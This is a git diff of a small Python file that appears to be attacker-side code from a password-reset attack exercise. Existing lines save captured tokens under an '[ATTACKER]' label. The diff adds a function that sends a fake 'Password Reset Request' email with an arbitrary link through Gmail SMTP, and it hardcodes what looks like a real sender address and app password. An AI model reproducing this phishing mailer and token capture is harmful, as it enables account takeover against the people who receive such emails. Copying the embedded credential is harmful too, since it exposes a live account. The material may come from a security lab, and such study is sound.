@@ -1,6 +1,8 @@
 import os
 from datetime import datetime
 
+import smtplib
+from email.mime.text import MIMEText
 
 def save_to_file(token):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -14,5 +16,35 @@ def save_to_file(token):
 
     print(f"[ATTACKER] Token saved to {path}")
 
-def send_email():
-    print("")
+
+
+def send_email(receiver_email, reset_link):
+
+    sender_email = "tzoricic17223ri@raf.rs"
+    app_password = "hsbg gsud mkde jvye"
+
+    subject = "Password Reset Request"
+
+    body = f"""
+            Hello,
+
+            We received a request to reset your password.
+
+            Click the link below:
+            {reset_link}
+
+            If this wasn't you, ignore this email.
+            """
+
+    msg = MIMEText(body)
+    msg["Subject"] = subject
+    msg["From"] = sender_email
+    msg["To"] = receiver_email
+
+    print("[EMAIL] Connecting to SMTP server...")
+
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+        server.login(sender_email, app_password)
+        server.send_message(msg)
+
+    print("[EMAIL] Sent successfully to", receiver_email)
